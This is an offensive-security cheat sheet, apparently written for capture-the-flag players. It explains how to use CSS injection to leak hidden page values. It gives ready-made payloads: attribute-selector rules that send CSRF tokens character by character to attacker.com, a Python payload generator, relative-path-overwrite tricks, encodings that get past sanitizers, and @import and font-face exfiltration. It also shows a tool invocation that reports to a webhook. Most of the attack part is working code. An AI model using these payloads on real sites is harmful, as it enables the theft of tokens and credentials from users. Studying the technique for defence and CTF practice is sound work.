# CSS Injection

## Concept

When attacker-controlled CSS is rendered in the victim's browser, attribute selectors can leak hidden values (CSRF tokens, API keys, PINs) character-by-character via out-of-band HTTP callbacks.

---

## Core Technique: Attribute Selector + Background URL

```css
/* If value starts with "a", make a request to attacker */
input[name=csrf][value^="a"] { background: url(https://attacker.com/leak?c=a) }
input[name=csrf][value^="b"] { background: url(https://attacker.com/leak?c=b) }
/* ... repeat for each character */
```

Each character that matches triggers a GET request → attacker learns the token char by char.

---

## Targets: What Can Be Leaked

| Target Element | Selector |
|---------------|---------|
| Hidden input (CSRF token) | `input[name=csrf][value^="X"]` |
| Meta tag content | `meta[name=token][content^="X"]` |
| Link href | `a[href^="/admin/X"]` |
| Form action | `form[action^="X"]` |
| Data attributes | `[data-token^="X"]` |

---

## Step-by-Step Leak Script

```python
import requests, string, time

TARGET = "http://TARGET:PORT"
ATTACKER_CB = "https://your-webhook.site/leak"
CHARSET = string.ascii_lowercase + string.digits + string.ascii_uppercase + "-_"

def gen_css(known: str) -> str:
    lines = []
    for c in CHARSET:
        probe = known + c
        lines.append(
            f'input[name=csrf][value^="{probe}"]'
            f'{{background:url({ATTACKER_CB}?v={probe})}}'
        )
    return "\n".join(lines)

# Inject gen_css(known) into CSS injection point
# Monitor webhook for callback — longest prefix received = next char found
```

---

## RPO (Relative Path Overwrite) — CSS Load Trick

When server allows path traversal in CSS URL and serves same page as CSS:

```
Normal: /app/styles/main.css
RPO:    /app/1%2f..%2f..%2fstyles/main.css
```

Browser interprets path as `/app/styles/main.css` but server returns page content.
If page has user input, that input becomes CSS → CSS injection.

```
Inject URL: /app/%3Fquery={}*{background:red}%2f..%2f../app/
```

---

## Bypass CSS Sanitizers

```css
/* Encode colon */
background: ur\l(https://attacker.com)

/* Newline injection */
background:
url(https://attacker.com)

/* Comment break */
background: /**/url(https://attacker.com)

/* Unicode escape */
\75rl(https://attacker.com)    /* url() */
```

---

## @import Exfiltration

When `<style>` injection is possible:

```css
@import url("https://attacker.com/evil.css");
```

`evil.css` contains the attribute selectors. Useful when length is limited.

---

## Font-Face + Unicode Range Leak

More advanced: leak content via font loading (when text content, not attributes):

```css
@font-face {
  font-family: leak;
  src: url(https://attacker.com/?c=a);
  unicode-range: U+0061;  /* 'a' */
}
div { font-family: leak, serif; }
```

If div contains 'a', browser requests the font URL → OOB leak.

---

## Tools

```bash
# Blind CSS Exfil — automated attribute leak
# https://github.com/d0nutptr/blind_css_exfil

python3 blind_css_exfil.py \
  --target "http://TARGET/page" \
  --css-param "style" \
  --attribute "value" \
  --selector 'input[name=csrf]' \
  --callback "https://webhook.site/YOUR_ID"
```

---

## Real CTF Examples

- **SECCON CTF 2018 - GhostKingdom**: CSS injection to leak CSRF token via background-url exfil
- **ASIS CTF 2019**: @import chain + attribute selector leak
- **PlaidCTF 2020 - CSS Calc**: font-face unicode-range leak

---

## Quick Payload Reference

```css
/* One-shot: inject into <style> tag or style= attribute */
input[name=token][value^="a"]{background:url(//CB/?a)}
input[name=token][value^="b"]{background:url(//CB/?b)}
/* ... generate all chars with script */

/* Compact single-line test */
*{background:url(https://webhook.site/UUID)}
```
